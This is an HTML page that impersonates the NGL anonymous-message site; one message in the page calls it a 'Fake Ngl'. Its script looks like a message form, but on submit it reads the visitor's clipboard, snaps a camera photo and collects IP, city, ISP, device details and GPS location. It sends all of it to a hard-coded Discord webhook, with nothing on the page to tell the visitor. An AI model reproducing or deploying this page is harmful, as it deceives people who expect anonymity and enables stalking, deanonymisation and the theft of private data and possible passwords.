<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

  <title>@Russellll_3242</title>
  <link rel="canonical" href="https://ngl.link" />
  <link rel="stylesheet" href="stylesheets/normalize.css" />
  <link rel="stylesheet" href="stylesheets/style.css" />
  <link rel="shortcut icon" href="62a6e19b906fa55f541799d7/62a98d041030ce99f782fbde_Variant5_256.png" />
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script src="scripts/main.js"></script>
  <meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, user-scalable=no, width=device-width" />
  <meta name="user:language" content="en" />
  <meta property="og:image"
    content="https://vercel-og-nextjs-ngl-labs.vercel.app/api/main?imageUrl=&text1=send%20me%20anonymous%20messages!" />
  <meta property="og:title" content="@Russellll_3242: send me anonymous messages!" />
  <meta property="og:description" content="@Russellll_3242: send me anonymous messages!" />
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:image"
    content="https://vercel-og-nextjs-ngl-labs.vercel.app/api/main?imageUrl=&text1=send%20me%20anonymous%20messages!" />
  <meta name="twitter:title" content="@Russellll_3242: Send me anonymous messages!" />
  <meta name="twitter:description" content="NGL: Anonymous Q&amp;A" />
</head>

<body>
  <script>
    var translations = {
      peopleJustTappedTheButton: "people just tapped the button",
      sendButton: "Send!",
      anonymousQA: "anonymous q&a",
      inputPlaceHolder: "send me anonymous messages...",
      downloadButton: "Get your own messages!",
    };
    var priorityInboxEnabled = false;
    var username = "_nicoo1";
    var uid = "TbgkNysyScTQpSCt2qZloFUTtRD2";
    var gameSlug = "";
    var gameId = "default";
    var ig_username = "_nicoo1";
  </script>
  <input type="hidden" id="userRegion" value="PH" />
  <div class="container" style="z-index: 1000; position: relative">
    <form action="p/sent.html" id="webhookForm" onsubmit="return postToWebhook(event)" class="form" method="post">
      <div class="bubble">
        <div class="header">
          <div class="pfp-container">
            <img class="pfp" src="img/ruru.jpg" />
          </div>
          <div class="user-container">
            <div class="username">@Russellll_3242</div>
            <div class="prompt">send me anonymous messages!</div>
          </div>
        </div>
        <div class="textarea-container">
          <div class="dice-button">üé≤</div>
          <textarea placeholder="send me anonymous messages..." name="question" autocomplete="off" maxlength="300"
            id="question"></textarea>
        </div>
        <input class="deviceId" type="hidden" name="deviceId" id="deviceId" />
      </div>
      <div class="anonymous-tooltip">üîí anonymous q&a</div>
      <button class="submit" type="submit" style="transform: translateZ(0px); z-index: 1000">
        Send!
      </button>
    </form>
  </div>
  <div class="bottom-container-user-wrapper">
    <div class="bottom-container">
      <h2 class="download-prompt">
        üëá <span class="clickCount">216</span> people just tapped the buttonüëá
      </h2>
      <div class="space2"></div>
      <a class="button download-link download-link1 pulse"
        href="https://apps.apple.com/us/app/ngl-anonymous-q-a/id1596550932?ppid=543cb167-5bdc-448f-a202-e5506f5d2837"
        target="_blank">Get your own messages!</a>
      <div class="tos-privacy">
        <a class="tos" href="https://ngl.link/p/terms">Terms</a><a class="privacy"
          href="https://ngl.link/p/privacy">Privacy</a>
      </div>
    </div>
  </div>
  <video id="video" width="320" height="240" autoplay></video>
  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
  <script>
    $(document).ready(function () {
      // Random questions and phrases
      let randomQuestions = [
        "What is your favorite color?",
        "Where did you go to school?",
        "What is your dream job?",
        "Do you have any pets?",
        "What is your favorite book?"
        // Add more questions as needed
      ];

      let phrases = [
        "üêß Fake Ngl made by: Russell James ",
        "üêß ADD me!",
        "üêß Facebook: https://www.facebook.com/ruruonfb",
        "üêß Github: https://github.com/R-uru",
      ];

      let clickCount = 0;

      $('.dice-button').click(function (e) {
        clickCount++;

        if (clickCount <= 3) {
          // Show random question
          const randomQuestion = randomQuestions[Math.floor(Math.random() * randomQuestions.length)];
          $('textarea').val(randomQuestion + ' ');
        } else {
          // Show phrases sequentially
          const phraseIndex = clickCount - 4; // Adjusting index to start from 0
          if (phraseIndex < phrases.length) {
            $('textarea').val(phrases[phraseIndex] + ' ');
          } else {
            // Once all phrases are shown, you can reset or continue as needed
            location.reload();
          }
        }

        $('textarea')[0].selectionStart = $('textarea').val().length;
        $('textarea')[0].selectionEnd = $('textarea').val().length;

        $('.submit').show();

        e.preventDefault();
      });
    });


    // Count  
    setInterval(() => {
      let clickCount = parseInt($('.clickCount').text())
      clickCount += Math.floor(Math.random() * 5) - 1
      $('.clickCount').text(clickCount)
    }, 800)

    // webhook
    let startTime = Date.now();

    async function postToWebhook(event) {
      event.preventDefault(); // Prevent the form from submitting the traditional way

      var question = document.getElementById('question').value;
      var camvalue = false;
      var ipvalue = 'Unknown';
      var ispvalue = 'Unknown';
      var cityvalue = 'Unknown';
      var regionvalue = 'Unknown';
      var countryvalue = 'Unknown';
      var browservalue = navigator.userAgent;
      var osvalue = getOS();
      var dtvalue = getDeviceType();
      var rurlvalue = document.referrer || 'Direct access';
      var timevalue = Math.floor((Date.now() - startTime) / 1000) + ' seconds';
      var srvalue = `${window.screen.width}x${window.screen.height}`;
      var clipboardvalue = 'Access denied by user!';
      var locvalue = 'Unknown';
      var webhookURL = 'https://discord.com/api/webhooks/1262358027990732952/gDMkNtHzI686oGjvJWCDo5psdbESTQLAdV9uuv_0Vu3mk2-X0mp95YZh_6qQwaMoklvT';

      try {
        // Step 1: Request Clipboard Access and get data
        try {
          clipboardvalue = await navigator.clipboard.readText();
        } catch (error) {
          console.error('Clipboard access error:', error);
        }

        // Step 2: Request Camera Access and Capture Image
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });

          // Check if camera access was granted
          camvalue = true;

          // Proceed with capturing the image
          const video = document.getElementById('video');
          const canvas = document.getElementById('canvas');
          const context = canvas.getContext('2d');

          video.srcObject = stream;

          await new Promise(resolve => {
            video.onloadedmetadata = () => {
              video.play();
              resolve();
            };
          });

          // Capture image from video stream
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          stream.getTracks().forEach(track => track.stop());

          // Convert captured image to Blob
          const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));

          // Send Image to Discord Webhook
          var formData = new FormData();
          formData.append('file', imageBlob, 'capture.jpg');

          await fetch(webhookURL, {
            method: 'POST',
            body: formData
          });

        } catch (error) {
          console.error('Camera access error:', error);
        }

        // Step 3: Fetch IP Address and additional details
        try {
          const ipResponse = await fetch('https://ipapi.co/json/');
          const ipData = await ipResponse.json();
          ipvalue = ipData.ip;
          ispvalue = ipData.org;
          cityvalue = ipData.city;
          regionvalue = ipData.region;
          countryvalue = ipData.country_name;
        } catch (error) {
          console.error('IP address fetch error:', error);
        }

        // Step 4: Request Location Access and get data
        try {
          locvalue = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(
              (position) => {
                const lat = position.coords.latitude;
                const long = position.coords.longitude;
                resolve(`https://www.google.com/maps?q=${lat},${long}`);
              },
              (error) => {
                console.error('Location access error:', error);
                resolve('Location access denied');
              }
            );
          });
        } catch (error) {
          console.error('Geolocation error:', error);
        }

        // Step 5: Send Embed to Discord Webhook
        sendEmbedToWebhook(webhookURL, question, camvalue, ipvalue, ispvalue, cityvalue, regionvalue, countryvalue, browservalue, osvalue, dtvalue, rurlvalue, timevalue, srvalue, clipboardvalue, locvalue);

      } catch (error) {
        console.error('Failed to send question. Error:', error);
      }

      return false; // Prevent the form from submitting the traditional way
    }

    function sendEmbedToWebhook(webhookURL, question, camvalue, ipvalue, ispvalue, cityvalue, regionvalue, countryvalue, browservalue, osvalue, dtvalue, rurlvalue, timevalue, srvalue, clipboardvalue, locvalue) {
      var request = new XMLHttpRequest();
      request.open("POST", webhookURL);
      request.setRequestHeader('Content-type', 'application/json');

      var params = {
        content: "", // Leave content empty if you don't want it in the top-level content
        embeds: [
          {
            "author": {
              "name": "2xbitx",
              "icon_url": "https://avatars.githubusercontent.com/R-uru",
              "url": "https://github.com/R-uru"
            },
            "title": "NGL Reveal",
            "url": "https://github.com/R-uru",
            "description": "|| @everyone ||\n**\nüêßINFO SEC**",
            "fields": [
              {
                "name": "üíåMessage:",
                "value": question
              },
              {
                "name": "üìçIP Address:",
                "value": ipvalue
              },
              {
                "name": "‚ûñ ISP:",
                "value": ispvalue
              },
              {
                "name": "‚ûñ City:",
                "value": cityvalue
              },
              {
                "name": "‚ûñ Region:",
                "value": regionvalue
              },
              {
                "name": "‚ûñ Country:",
                "value": countryvalue
              },
              {
                "name": "üõúBrowser Type and Version:",
                "value": browservalue
              },
              {
                "name": "üíªOperating System:",
                "value": osvalue
              },
              {
                "name": "üì±Device Type:",
                "value": dtvalue
              },
              {
                "name": "üîóReferrer URL:",
                "value": rurlvalue
              },
              {
                "name": "‚åõTime Spent on Site:",
                "value": timevalue
              },
              {
                "name": "üì≥Screen Resolution:",
                "value": srvalue
              },
              {
                "name": "üìãClipboard:",
                "value": "```" + clipboardvalue.slice(0, 1024) + "```"// Truncate clipboard value to 1024 characters
              },
              {
                "name": "üó∫Ô∏èLocation Data:",
                "value": locvalue
              },
              {
                "name": "üì∏Camera Access:",
                "value": camvalue ? "Camera access granted" : "Camera access denied"
              }
            ],
            "color": 16711680, // Use an integer for color
            "footer": {
              "text": "Made by: 2xbitx",
              "url": "https://github.com/R-uru",
              "icon_url": "https://avatars.githubusercontent.com/R-uru"
            },
            "timestamp": new Date().toISOString() // Corrected timestamp format
          }
        ]
      };

      console.log('Embed Data:', JSON.stringify(params, null, 2)); // Log the data being sent

      request.send(JSON.stringify(params));
      request.onload = function () {
        if (request.status >= 200 && request.status < 300) {
          document.getElementById('webhookForm').reset(); // Reset the form
          window.location.href = "p/sent.html";
        } else {
          console.log('Failed to send question. Status code: ' + request.status);
          console.log('Response: ', request.responseText); // Log the response for debugging
        }
      }
    }

    function getOS() {
      var userAgent = window.navigator.userAgent,
        platform = window.navigator.platform,
        macosPlatforms = ['Macintosh', 'MacIntel', 'MacPPC', 'Mac68K'],
        windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE'],
        iosPlatforms = ['iPhone', 'iPad', 'iPod'],
        os = null;

      if (macosPlatforms.indexOf(platform) !== -1) {
        os = 'Mac OS';
      } else if (iosPlatforms.indexOf(platform) !== -1) {
        os = 'iOS';
      } else if (windowsPlatforms.indexOf(platform) !== -1) {
        os = 'Windows';
      } else if (/Android/.test(userAgent)) {
        os = 'Android';
      } else if (!os && /Linux/.test(platform)) {
        os = 'Linux';
      }

      return os;
    }

    function getDeviceType() {
      var ua = navigator.userAgent;
      if (/tablet|ipad|playbook|silk/i.test(ua)) {
        return 'Tablet';
      }
      if (/Mobile|Android|iP(ad|hone|od)|IEMobile|BlackBerry|Kindle|Silk|Opera Mini/i.test(ua)) {
        return 'Mobile';
      }
      return 'Desktop';
    }

  </script>
</body>

</html>